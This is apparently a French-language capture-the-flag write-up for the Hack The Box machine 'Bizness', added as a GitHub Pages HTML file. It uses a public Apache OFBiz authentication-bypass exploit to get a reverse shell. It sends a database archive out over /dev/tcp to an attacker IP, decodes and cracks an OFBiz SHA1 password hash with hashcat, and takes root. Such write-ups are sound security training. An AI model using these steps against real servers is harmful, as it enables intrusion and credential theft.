@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Bizness | Writeup</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="Bizness" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="monkey bizness really" />
+<meta property="og:description" content="monkey bizness really" />
+<link rel="canonical" href="/HTB/season4/bizness.html" />
+<meta property="og:url" content="/HTB/season4/bizness.html" />
+<meta property="og:site_name" content="Writeup" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2026-03-16T17:36:00+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Bizness" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2026-03-16T17:36:00+01:00","datePublished":"2026-03-16T17:36:00+01:00","description":"monkey bizness really","headline":"Bizness","mainEntityOfPage":{"@type":"WebPage","@id":"/HTB/season4/bizness.html"},"url":"/HTB/season4/bizness.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link rel="preload" href="https://fonts.googleapis.com/css?family=Open+Sans:400,700&display=swap" as="style" type="text/css" crossorigin>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#157878">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+  <body>
+    <a id="skip-to-content" href="#content">Skip to the content.</a>
+
+    <header class="page-header" role="banner">
+      <h1 class="project-name">Bizness</h1>
+      <h2 class="project-tagline">monkey bizness really</h2>
+      
+      
+    </header>
+
+    <main id="content" class="main-content" role="main">
+      <h1 id="foothold">Foothold</h1>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/bizness%20images/Pasted%20image%2020260318085145.png"></span></p>
+
+<p>On arrive sur la page de “Bizness incorporate”. Alors évidemment, en descendant suffisamment, on peut lire que le framework est Apache OfBiz.</p>
+
+<p>En cherchant sur internet on trouve assez vite un exploit <a href="https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass" class="web-link">ici</a>. On peut tester que cela fonctionne avec la commande</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 exploit.py --url https://bizness.htb
+</code></pre></div></div>
+<p>qui nous donne en sortie que la cible a l’air d’être vulnérable. Et lorsque l’on exécute</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 exploit.py --url https://bizness.htb --cmd 'id'
+</code></pre></div></div>
+<p>on nous dit de vérifier la sortie de la commande. Il ne faut pas oublier bien sûr qu’il y a une redirection vers https donc il faut bien utiliser cette origine. Aussi vite que ça on a notre revshell.</p>
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/bizness%20images/Pasted%20image%2020260318095918.png"></span></p>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/bizness%20images/Pasted%20image%2020260318095927.png"></span></p>
+
+<p>On upgrade notre shell</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 -c 'import pty;pty.spawn("/bin/bash");'
+</code></pre></div></div>
+<p>^Z</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stty raw -echo; fg
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stty rows 24 cols 80
+export SHELL=bash
+export TERM=xterm-256color
+export LS_OPTIONS='--color=auto'
+eval "`dircolors`"
+alias ls='ls $LS_OPTIONS'
+export PS1='\[\e]0;\u@\h: \w\a\]\[\033[01;32m\]\u@\h\[\033[01;34m\] \w\$\[\033[00m\] '
+</code></pre></div></div>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/bizness%20images/Pasted%20image%2020260318100022.png"></span></p>
+
+<h1 id="privilege-escalation-to-root">Privilege Escalation to root</h1>
+
+<p>Une fois le shell obtenu on regarde l’utilisateur que l’on a et le dossier <code class="language-plaintext highlighter-rouge">/home</code> et on y trouve notre flag, on a bien l’utilisateur.</p>
+
+<p>(cette partie vient du writeup) Il fallait trouver le fichier <code class="language-plaintext highlighter-rouge">/opt/ofbiz/runtime/data/derby/ofbiz</code>, que l’on télécharge sur notre machine avec</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nlvp 4443 &gt; ofbiz.tar
+</code></pre></div></div>
+<p>puis sur la target</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tar -cvf ofbiz.tar /opt/ofbiz/runtime/data/derby/ofbiz
+cat ofbiz.tar &gt; /dev/tcp/10.10.15.35/4443
+</code></pre></div></div>
+<p>Enfin, sur notre machine, on extrait et on se connecte</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tar -xvf ofbiz.tar
+ij
+&gt; connect 'jdbc:derby:opt/ofbiz/runtime/data/derby/ofbiz';
+</code></pre></div></div>
+
+<p>On peut commencer à lire les données: lister les tables, utilisateurs, …</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>help;
+show tables;
+select * from OFBIZ.USER_LOGIN;
+</code></pre></div></div>
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/bizness%20images/Pasted%20image%2020260319101234.png"></span></p>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/bizness%20images/Pasted%20image%2020260319101849.png"></span></p>
+
+<p>On trouve un mot de passe:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
+</code></pre></div></div>
+
+<p>Grâce à notre repérage on sait déjà que c’est dans le format sha1. On le crack avec hashcat. En revanche, cela retourne une erreur. En regardant dans <code class="language-plaintext highlighter-rouge">hashCrypt.java</code>, on trouve ces lignes</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public static boolean comparePassword(String crypted, String defaultCrypt, String
+password) {
+if (crypted.startsWith("{PBKDF2")) {
+return doComparePbkdf2(crypted, password);
+} else if (crypted.startsWith("{")) {
+return doCompareTypePrefix(crypted, defaultCrypt,
+password.getBytes(UtilIO.getUtf8()));
+} else if (crypted.startsWith("$")) {
+return doComparePosix(crypted, defaultCrypt,
+password.getBytes(UtilIO.getUtf8()));
+} else {
+return doCompareBare(crypted, defaultCrypt,
+password.getBytes(UtilIO.getUtf8()));
+}
+</code></pre></div></div>
+
+<p>On sait que l’on a un sha1 donc le programme passe notre hash par cette fonction</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>private static boolean doComparePosix(String crypted, String defaultCrypt, byte[]
+bytes) {
+int typeEnd = crypted.indexOf("$", 1);
+int saltEnd = crypted.indexOf("$", typeEnd + 1);
+String hashType = crypted.substring(1, typeEnd);
+String salt = crypted.substring(typeEnd + 1, saltEnd);
+String hashed = crypted.substring(saltEnd + 1);
+return hashed.equals(getCryptedBytes(hashType, salt, bytes));
+}
+</code></pre></div></div>
+
+<p>Ce qui fait que “d” est notre salt et le reste notre hash. On regarde la dernière fonction</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>private static String getCryptedBytes(String hashType, String salt, byte[] bytes)
+{
+try {
+MessageDigest messagedigest = MessageDigest.getInstance(hashType);
+messagedigest.update(salt.getBytes(UtilIO.getUtf8()));
+messagedigest.update(bytes);
+return
+Base64.encodeBase64URLSafeString(messagedigest.digest()).replace('+', '.');
+} catch (NoSuchAlgorithmException e) {
+throw new GeneralRuntimeException("Error while comparing password", e);
+}
+}
+</code></pre></div></div>
+
+<p>Pour reverse ça on passe par python</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt;&gt; enc = "uP0_QaVBpDWFeo8-dRzDqRwXQ2I"
+&gt;&gt;&gt; enc = enc.replace('_', '/')
+&gt;&gt;&gt; enc = enc.replace('-', '+')
+&gt;&gt;&gt; enc
+'uP0/QaVBpDWFeo8+dRzDqRwXQ2I'
+</code></pre></div></div>
+
+<p>On passe en base64 en ajoutant un =</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt;&gt; enc += '='
+&gt;&gt;&gt; dec = base64.b64decode(enc.encode('utf-8'))
+&gt;&gt;&gt; dec
+b'\xb8\xfd?A\xa5A\xa45\x85z\x8f&gt;u\x1c\xc3\xa9\x1c\x17Cb'
+</code></pre></div></div>
+
+<p>Et enfin on récupère notre hash</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt;&gt; import binascii
+&gt;&gt;&gt; binascii.hexlify(dec)
+b'b8fd3f41a541a435857a8f3e751cc3a91c174362'
+</code></pre></div></div>
+
+<p>Puis on le passe par hashcat</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo 'b8fd3f41a541a435857a8f3e751cc3a91c174362:d' &gt; hash.txt            
+hashcat -a 0 -m 120 hash.txt --wordlist /usr/share/wordlists/rockyou.txt
+</code></pre></div></div>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/bizness%20images/Pasted%20image%2020260319112112.png"></span></p>
+
+<p>Et on trouve le mot de passe</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>monkeybizness
+</code></pre></div></div>
+
+<p>On tente de</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>su root
+</code></pre></div></div>
+<p>Et ça fonctionne, on a notre root shell!</p>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/bizness%20images/Pasted%20image%2020260319112237.png"></span></p>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/bizness%20images/Pasted%20image%2020260319112325.png"></span></p>
+
+
+
+      <footer class="site-footer">
+        
+        <span class="site-footer-credits">This page was generated by <a href="https://pages.github.com">GitHub Pages</a>.</span>
+      </footer>
+    </main>
+  </body>
+</html>
